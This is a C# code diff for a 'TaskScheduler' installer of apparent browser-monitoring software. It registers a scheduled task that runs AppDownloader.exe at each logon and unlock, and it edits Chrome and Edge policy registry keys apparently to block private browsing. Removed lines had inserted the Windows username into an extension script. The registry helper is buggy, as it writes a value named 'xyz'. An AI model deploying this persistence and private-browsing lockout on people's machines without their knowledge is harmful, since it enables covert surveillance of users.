@@ -13,28 +13,10 @@ namespace TaskScheduler
     {
         static void Main(string[] args)
         {
-            string _userInner = WindowsIdentity.GetCurrent().Name.Replace(@"\","\\\\");
-            string hostName = Dns.GetHostName();
-            if (File.Exists("extension/js/background.js"))
-            {
-                var js = File.ReadAllText("extension/js/background.js");
-                js = js.Replace("$user$", _userInner);
-                File.WriteAllText("extension/js/background.js", js);
-            }
-
-            var processes = Process.GetProcessesByName("AppController");
-            if(processes!= null && processes.Any())
-            {
-                foreach(var proc in processes)
-                {
-                    proc.Kill();
-                }
-            }
-
             using (TaskService ts = new TaskService())
             {
                 var task = ts.AllTasks.FirstOrDefault(_ => _.Name == "AppControllerTask");
-                if(task != null)
+                if (task != null)
                 {
                     ts.RootFolder.DeleteTask("AppControllerTask");
                 }
@@ -54,28 +36,36 @@ namespace TaskScheduler
                 td.Settings.ExecutionTimeLimit = new TimeSpan();
                 td.Settings.StopIfGoingOnBatteries = false;
                 td.Settings.RunOnlyIfIdle = false;
-                
+
                 var tt = new LogonTrigger();
-                
+
                 td.Triggers.Add(tt);
                 var tt1 = new SessionStateChangeTrigger(TaskSessionStateChangeType.SessionUnlock);
                 td.Triggers.Add(tt1);
                 var path = AppDomain.CurrentDomain.BaseDirectory;
-                var st = string.Empty;
-                if (System.IO.File.Exists("StartProcess.bat"))
-                {
-                    st = System.IO.File.ReadAllText("StartProcess.bat");
-                    st = st.Replace("$Path$", $"{path}AppController.exe");
-                    File.WriteAllText("StartProcess.bat", st);
-                }
-                
-                
-                td.Actions.Add(new ExecAction($"\"\"{path}StartProcess.bat\"\"", null, null));
-                
+
+                td.Actions.Add(new ExecAction($"\"\"{path}AppDownloader.exe\"\"", null, null));
+
                 // Register the task in the root folder
                 ts.RootFolder.RegisterTaskDefinition(@"AppControllerTask", td);
                 var t = ts.AllTasks.FirstOrDefault(_ => _.Name == "AppControllerTask");
                 var j = t.Run();
+
+                AddKey("SOFTWARE\\Policies\\Google\\Chrome", "IncognitoModeAvailability");
+                AddKey("SOFTWARE\\Policies\\Microsoft\\Edge", "InPrivateModeAvailability");
+            }
+        }
+
+        private static void AddKey(string path, string key)
+        {
+            var obj = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(path, true);
+            if(obj != null)
+            {
+                var keys = obj.GetValueNames();
+                if (!keys.Contains(key))
+                {
+                    obj.SetValue("xyz", 1);
+                }
             }
         }
     }
